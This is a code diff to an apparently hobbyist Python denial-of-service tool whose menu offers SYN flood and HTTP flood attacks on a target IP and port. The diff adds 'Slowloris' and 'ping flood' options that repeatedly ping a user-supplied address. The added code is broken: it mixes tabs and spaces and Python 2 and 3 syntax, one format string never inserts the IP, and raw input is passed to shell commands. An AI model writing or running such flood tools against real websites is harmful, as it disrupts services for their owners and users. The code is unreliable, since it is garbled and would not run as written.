@@ -75,8 +75,10 @@ def main():
     print("Coded By: ParzivalHack")
     print("Github: https://github.com/ParzivalHack")
     print("      [Menu]      ")
-    print("1) SYN Flood (For small websites)")
-    print("2) HTTP Flood (For medium websites)")
+    print("1) SYN Flood Attack")
+    print("2) HTTP Flood Attack")
+    print("3) Slowloris Ping Attack")
+    print("4) Ping Flood Attack")
     option = int(input("Choose an option: "))
     print(option)
     if option == 1:
@@ -103,7 +105,33 @@ def main():
         target = raw_input("Target IP: ")
         port = int(input("Target Port (80 suggested): "))
         Attack(target, port)
-
-
+    elif option == 3:
+	os.system("clear")
+	print("  ______    ____       _____")
+        print(" /_  __/   / __ \____ / ___/")
+        print("  / /_____/ / / / __ \\__ \ ")
+        print(" / /_____/ /_/ / /_/ /__/ / ")
+        print("/_/     /_____/\____/____/  ")
+        ip = str(input("Target IP: "))
+        ping_number = int(input("Number of pings (5000 suggested): "))
+        for a in range(ping_number):
+		os.system(f"ping {ip}")
+    elif option == 4:
+	os.system("clear")
+	print("  ______    ____       _____")
+        print(" /_  __/   / __ \____ / ___/")
+        print("  / /_____/ / / / __ \\__ \ ")
+        print(" / /_____/ /_/ / /_/ /__/ / ")
+        print("/_/     /_____/\____/____/  ")
+	ip_addr = input("Target IP: ") 
+        pings = input("Number of pings: ")
+        stream = os.popen(f'ping -c {pings}'.format(ip_addr)) 
+        output = stream.read() 
+        if '0 received' in output:
+		print('IP unreachable') 
+	else:
+		print('IP reachable')
+		print(output)
+	
 if __name__ == "__main__":
     main()
